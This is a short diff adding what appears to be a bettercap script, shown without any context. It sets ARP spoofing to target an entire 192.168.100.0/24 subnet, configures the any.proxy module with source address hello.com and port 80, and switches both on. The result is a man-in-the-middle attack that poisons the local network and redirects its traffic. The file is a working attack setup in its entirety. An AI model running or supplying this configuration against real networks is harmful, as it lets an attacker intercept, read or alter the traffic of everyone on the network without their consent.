@@ -1,0 +1,5 @@
+set arp.spoof.targets 192.168.100.0/24
+set any.proxy.src_address hello.com
+set any.proxy.dst_port 80
+arp.spoof on
+any.proxy on
